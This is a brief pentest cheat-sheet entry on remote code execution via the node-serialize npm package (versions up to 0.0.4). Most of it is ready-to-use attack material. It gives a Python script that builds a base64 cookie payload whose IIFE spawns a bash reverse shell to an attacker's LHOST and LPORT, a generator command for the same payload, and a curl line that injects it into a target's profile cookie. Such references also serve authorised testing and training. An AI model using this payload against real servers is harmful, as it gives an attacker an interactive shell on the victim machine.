# Node.js Deserialization RCE (unserialize)

The `node-serialize` npm package executes IIFE (Immediately Invoked Function Expressions) in deserialized objects — RCE via cookie or parameter.

**Craft payload:**
```python
import base64, json

# Payload with IIFE wrapper: _$$ND_FUNC$$_function(){}()
payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"',function(error, stdout, stderr){console.log(stdout)});}()"
}
encoded = base64.b64encode(json.dumps(payload).encode()).decode()
print(encoded)
```

**Or generate with nodejsshell.py (from ysoserial-like tools):**
```bash
python nodejsshell.py <LHOST> <LPORT>
# wraps in {"rce":"_$$ND_FUNC$$_<payload>"}
```

**Inject into cookie:**
```bash
curl http://<TARGET>/ -H "Cookie: profile=<base64_payload>"
```

**Identify:** base64-decoded cookie contains JSON with function strings, often `profile` or `user` cookie name.

Affected package: `node-serialize ≤ 0.0.4`.
